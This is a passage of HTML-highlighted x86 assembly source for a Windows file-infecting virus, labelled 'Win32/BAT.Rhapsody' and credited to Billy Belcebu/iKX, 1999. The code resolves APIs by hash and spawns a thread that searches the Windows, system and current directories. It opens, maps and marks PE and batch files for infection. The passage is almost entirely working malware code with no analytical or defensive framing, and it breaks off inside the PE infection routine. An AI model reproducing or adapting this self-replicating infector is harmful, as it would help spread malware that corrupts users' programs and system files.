</span><span class="sc5">@WaitForSingleObject</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0D4540229h</span><span class="sc0">
</span><span class="sc5">@GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">083A353C3h</span><span class="sc0">
</span><span class="sc5">@GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05CDF6B6Ah</span><span class="sc0">
</span><span class="sc5">n_NeededAPIs</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">apiCRC32</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Virus copyright ;)                                                      ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[Win32/BAT.Rhapsody]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"(c) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ The virus code goes here                                                ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">over_virus_apis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckImageBase</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ExitVirusExecution</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckImageBase</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ExitVirusExecution</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">apiCRC32</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">api_addresses</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_NeededAPIs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">
       
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">lpThreadId</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpThreadId</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwCreationFlags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; lpParameter</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusThread</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpStartAddress</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwStackSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateThread</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WaitForSingleObject</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">ExitVirusExecution</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc4">+(</span><span class="sc5">FakeHost</span><span class="sc4">-</span><span class="sc5">W32Rhapsody</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"Welcome to the enchanted lands..."</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Virus Thread                                                            ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">VirusThread</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_offset</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_seh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitVirusThreadSEH</span><span class="sc0">
</span><span class="sc5">over_seh</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">current_directory</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">infection_directory</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">infection_directory</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">current_directory</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFilesInDirectory</span><span class="sc0">

</span><span class="sc5">ExitVirusThreadSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">ExitVirusThread</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitThread</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
</span><span class="sc5">VirusThread</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Infect all files in directory                                           ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">SetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">infection_directory</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">InfectFilesInDirectory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SEARCH_MASK</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FailOccured</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">SearchForMore</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ModBase</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">OldEIP</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WFD_szFileName</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AnalyzeFileName</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ItsNotGoodFile</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ItIsPE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectBAT</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ItsNotGoodFile</span><span class="sc0">
</span><span class="sc5">ItIsPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectPE</span><span class="sc0">
</span><span class="sc5">ItsNotGoodFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">OldEIP</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ModBase</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WFD_szFileName</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">SearchHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SearchForMore</span><span class="sc0">

</span><span class="sc5">CloseSearchHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">SearchHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
</span><span class="sc5">FailOccured</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Infect PE files                                                         ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">InfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; Destroy hostile attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributesA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Open file for R/W</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitInfectPE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Save handle of opened file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                   </span><span class="sc1">; Get its size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">total_size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; push handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ECX = Size to map</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MapHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MapAddress</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc3">"pahR"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc3">"ydos"</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

